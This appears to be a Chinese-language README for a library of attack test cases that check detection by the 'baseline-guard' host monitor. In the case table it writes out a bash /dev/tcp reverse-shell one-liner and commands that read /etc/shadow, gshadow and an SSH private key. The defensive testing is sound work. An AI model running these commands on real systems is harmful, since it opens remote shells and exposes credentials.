# baseline-guard 攻击用例库

6 个攻击用例，每个用例 = `run.sh`（攻击动作）+ `verify.sh`（预期事件核对）+ `cleanup.sh`（清理步骤）。
所有用例对同一 monitor 实例执行，验证脚本查询 `events.db`（遥测事件）和 `baseline.db`（alerts 表），
用打标机（mark）做增量计数，因此用例可以连跑多遍、结果互不干扰。

## 用例清单

| 编号 | 名称 | 攻击动作 | 预期事件 | 清理 |
|---|---|---|---|---|
| case-01 | 反弹 shell | `bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'`（本机 nc 监听配合） | process.exec(bash) ×≥2；network.connect 127.0.0.1:4444 ×≥1 | 杀掉 nc 监听 |
| case-02 | 读 /etc/shadow | `cat /etc/shadow`（root） | alerts(/etc/shadow, read)；file.read 事件带进程全路径 + 祖先链 | 无副作用 |
| case-03 | chmod 777 敏感文件 | `chmod 777 /tmp/bg-attack-cases/chmod-target.conf` | alerts(perm/chmod)；file.chmod 事件带操作者进程 | 恢复 644 |
| case-04 | 容器内执行 docker 命令 | 容器挂载 docker.sock 执行 `docker ps` | 容器内 process.exec ×≥1，container_id 为 12 位短 ID。**已知边界**：net_watch 只覆盖 TCPv4+DNS，AF_UNIX 连接无网络事件，以 exec 链+容器归属为判定信号 | 容器 --rm 自清理 |
| case-05 | 敏感路径批量读取 | root 下循环 `cat /etc/shadow /etc/gshadow /root/.ssh/id_rsa` | 每个文件各 ≥1 条 file.read，进程链完整（exe 非空 + ancestors ≥1）；AC-05A/05B alerts ×≥2（shadow 告警与 case-02 共用规则/节流窗口，见实测发现 5） | 假密钥由 run_all 统一删 |
| case-06 | 容器内篡改挂载的基线文件（M0-1 验收） | 容器挂载受保护文件并追加写入 | alerts 带容器短 ID（container_id 非空）；file.write 事件带同样 container_id | 恢复文件内容 |

## 执行方式

```bash
sudo -v                          # 先缓存凭据
sudo -n bash tests/attack-cases/run_all.sh
```

run_all.sh 做的事：
1. 前置检查（sudo 凭据、baseline-guard、docker）。
2. 准备用例文件（chmod 目标、受保护基线文件；`/root/.ssh/id_rsa` 不存在时生成临时假密钥并打标）。
3. 以 `tests/attack-cases/config.yaml` 启动 monitor（LSM 或 kprobe 自动降级），等待 "Monitoring started"。
4. 6 个用例连跑 2 遍，每遍 run → verify → cleanup；轮间等待 12s 让告警节流（throttle=10s）过期，保证每遍告警都能落库。
5. SIGTERM 优雅停止 monitor，输出 PASS/FAIL 汇总。退出码 0 = 12 项（6 用例 × 2 轮）全 PASS。

单独跑某个用例（monitor 已在运行时）：

```bash
bash tests/attack-cases/case-02-read-etc-shadow/run.sh my-tag
bash tests/attack-cases/case-02-read-etc-shadow/verify.sh my-tag
```

## 配置说明（config.yaml）

- 监控路径：`/etc/shadow`、`/etc/gshadow`、`/root/.ssh/id_rsa`（read/write/delete/chmod alert）、
  `/tmp/bg-attack-cases/chmod-target.conf`、`/tmp/bg-attack-cases/protected-baseline.conf`。
- `throttle: 10`：有意调小，保证连跑 2 遍时每遍告警都能落库（仓库根 config.yaml 的 300s 节流会让第 2 遍丢告警）。
- webhook 留空，仅本地落 alerts 表。

## 实测发现（2026-10-03 首轮验证踩出，已按实际行为修正 verify 脚本）

1. **monitor 实时告警固定落系统库 `/var/lib/baseline-guard/baseline.db`**（`main.cpp` 中 alert_db
   使用默认路径），与 `monitor --db` 指定的文件无关。verify 查 alerts 必须查系统库（root 权限）。
2. **规则类告警的 event_type 归一化为 `read`/`write`**（chmod 触发也是 `write`）；
   `perm_changed`/`hash_changed`/`missing` 只属于离线基线核查（rule_id=`baseline-check`）。
3. **process.exec 事件暂无 container_id 富化**（M0-1 只覆盖 file/priv/ns 类事件）；
   容器内进程的归属判据是祖先链中的 `runc` / `containerd-shim`（实测存在）。
4. 容器场景下 LSM 钩子记录的是**宿主机路径**（不是容器内的挂载路径），container_id 列为 12 位短 ID。
5. **同一文件只允许一条监控规则**：规则按 inode 注册进 `inode_to_rule` map，两条规则配同一
   路径时后加载的覆盖先加载的（本轮实测：给 /etc/shadow 加第二条规则 AC-05C 后，AC-02 整轮零告警）。
   因此 case-05 的 shadow 告警与 case-02 共用 AC-02 及其 10s 节流窗口，verify 对 shadow 告警不做硬性预期
   （事件维度验证不受影响），gshadow/id_rsa 由 AC-05A/AC-05B 独占、稳定告警。
6. verify 查询 alerts 必须带 `rule_id` 过滤，否则相邻用例的同路径告警会造成假阳性（本轮实测踩过）。

## 已知边界

- **case-04**：AF_UNIX socket 连接（docker.sock）不在 net_watch 覆盖范围（当前仅 TCPv4 connect/accept/bind + DNS）。
  判定信号为容器内 exec 链 + 祖先链容器运行时归属；unix 连接遥测、exec 事件 container_id 富化是后续迭代项。
- exec 事件的 argv/cmdline 采集在 W2 时列为边界，若仍未采集，反弹 shell 的命令行内容不可见，用 connect 事件做唯一性判定。
